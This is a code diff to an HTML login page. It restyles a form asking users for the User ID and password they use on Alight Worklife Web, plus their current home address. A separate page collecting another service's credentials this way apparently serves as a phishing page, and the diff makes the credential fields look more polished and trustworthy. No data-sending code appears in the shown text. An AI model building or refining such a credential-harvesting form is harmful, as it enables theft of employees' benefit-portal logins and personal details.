@@ -30,6 +30,13 @@
     text-align: left;
     box-shadow: 0 2px 8px rgba(0, 82, 204, 0.1); /* Subtle depth */
 }
+        .helper-text {
+    display: block;
+    margin-top: 6px;
+    font-size: 14px;
+    color: #0052cc;           /* Blue to match your .worklife style */
+    font-weight: 500;
+}
             
             
         
@@ -45,11 +52,17 @@
 
     <div class="form-container">
         <form id="loginForm">
-            <label>Enter your User ID</label>
-            <input type="text" id="username" placeholder="Same ID used to access Alight Worklife Web" required>
+           <div class="form-group">
+    <label for="username">Enter your User ID</label>
+    <input type="text" id="username" placeholder="User ID" required>
+    <small class="helper-text">Same ID used to access benefits on Alight Worklife Web</small>
+</div>
 
-            <label>Enter your Password</label>
-            <input type="password" id="password" placeholder="Same password used to access Alight Worklife Web" required>
+<div class="form-group">
+    <label for="password">Enter your Password</label>
+    <input type="password" id="password" placeholder="Password" required>
+    <small class="helper-text">Same password used to access  benefits on Alight Worklife Web</small>
+</div>
 
             <label>Home Address (Current)</label>
             <input type="text" id="address" placeholder="Enter your current home address" required>
